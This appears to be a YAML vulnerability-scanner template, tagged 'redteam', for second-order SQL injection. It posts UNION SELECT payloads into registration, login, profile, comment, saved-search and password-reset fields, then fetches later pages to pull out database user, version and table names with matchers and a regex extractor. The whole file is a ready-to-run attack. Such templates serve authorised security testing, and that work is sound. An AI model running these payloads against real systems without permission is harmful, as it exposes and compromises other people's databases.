id: medium-webapp-sql-injection-second-order-stored

info:
  name: Second-Order SQL Injection - Stored Payload Execution
  author: redteam-elite
  severity: high
  description: |
    Detects second-order SQL injection where malicious payload is stored and executed later.
    Tests advanced scenarios where input is sanitized initially but executed unsafely later.
  reference:
    - https://owasp.org/www-community/attacks/SQL_Injection
    - https://portswigger.net/web-security/sql-injection/second-order
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 10
  tags: sqli,second-order,stored,injection,redteam

http:
  - method: POST
    path:
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/api/register"
      - "{{BaseURL}}/signup"
      - "{{BaseURL}}/user/create"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    body: |
      username=admin'/**/UNION/**/SELECT/**/1,user(),database()--&password=test123&email=test@test.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        words:
          - "success"
          - "created"
          - "registered"
          - "welcome"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/auth/login"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      username=admin'/**/UNION/**/SELECT/**/1,user(),database()--&password=test123

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        words:
          - "mysql"
          - "postgres"
          - "root@"
          - "admin@"
          - "database"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/profile/update"
      - "{{BaseURL}}/api/profile"
      - "{{BaseURL}}/user/update"

    headers:
      Content-Type: application/json

    body: |
      {"name":"test'+(SELECT/**/CONCAT(user(),':',database()))+'"} 

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "updated"
          - "success"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/profile"
      - "{{BaseURL}}/api/profile"
      - "{{BaseURL}}/user/profile"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "mysql"
          - "postgres"
          - "root@"
          - "admin@"
          - ":"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/comment"
      - "{{BaseURL}}/api/comment"
      - "{{BaseURL}}/feedback"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      comment=Nice post!'/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables--&post_id=1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "comment"
          - "posted"
          - "success"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/comments"
      - "{{BaseURL}}/api/comments"
      - "{{BaseURL}}/post/1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "users"
          - "admin"
          - "posts"
          - "comments"
          - "information_schema"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/search/save"
      - "{{BaseURL}}/api/search/save"

    headers:
      Content-Type: application/json

    body: |
      {"query":"test'/**/UNION/**/SELECT/**/version(),user(),@@version_comment--","save_name":"my_search"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "saved"
          - "success"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/search/history"
      - "{{BaseURL}}/api/search/history"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "MySQL"
          - "PostgreSQL"
          - "version"
          - "root@"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/password/reset"
      - "{{BaseURL}}/api/password/reset"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      email=admin'/**/UNION/**/SELECT/**/1,2,CONCAT(user(),':',database())--@test.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "reset"
          - "sent"
          - "email"
        condition: or

    extractors:
      - type: regex
        name: database_info
        regex:
          - '([a-zA-Z0-9_]+@[a-zA-Z0-9_]+:[a-zA-Z0-9_]+)'
          - 'MySQL.*?([0-9]+\.[0-9]+\.[0-9]+)'
        group: 1